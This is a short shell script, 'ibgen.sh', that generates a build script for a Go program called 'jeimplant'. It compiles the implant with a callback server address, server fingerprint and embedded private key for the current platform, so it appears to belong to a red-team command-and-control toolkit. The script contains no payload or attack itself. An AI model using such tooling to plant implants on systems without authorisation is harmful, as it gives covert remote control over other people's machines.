#!/bin/sh
#
# ibgen.sh
# Generates an implant-builder script
# By J. Stuart McMurray
# Created 20220409
# Last Modified 20220409

set -e

function usage {
        echo "Usage: $0 serveraddr fingerprint implantkeyfile" >&2
        exit 1
}
if [ "-h" == "$1" ]; then
        usage
fi

# addldflag prints an -X 'main.$1=$2' chunk of ldflags
function addldflag {
        echo -n "-X 'main.$1=$2'"
}

# Make sure we have the needed bits
SADDR=$1
FP=$2
IKEY=$3
OK=false
if [ "" == "$SADDR" ]; then
        echo "Missing server address" >&2
elif [ "" == "$FP" ]; then
        echo "Missing server fingerprint" >&2
elif [ "" == "$IKEY" ]; then
        echo "Missing implant key file" >&2
else
        OK=true
fi
if ! $OK; then
        echo "" >&2
        usage
fi

# Generate build script itself
echo    '#!/bin/sh'
echo    'set -e'
echo    "cd '$(pwd)'"
echo    'O="$(pwd)/bin/jeimplant-$(go env GOOS)-$(go env GOARCH)"'
echo    'if [ "windows" == "$(go env GOOS)" ]; then O="$O.exe"; fi'
echo -n 'go build -trimpath -ldflags "'
addldflag "ServerAddr" "$SADDR"
echo -n ' '
addldflag "ServerFP" "$FP"
echo -n ' '
addldflag "PrivKey" "$(openssl base64 -A -in "$IKEY")"
echo -n '" -o "$O" '
echo    './cmd/jeimplant'
echo 'ls "$O"'
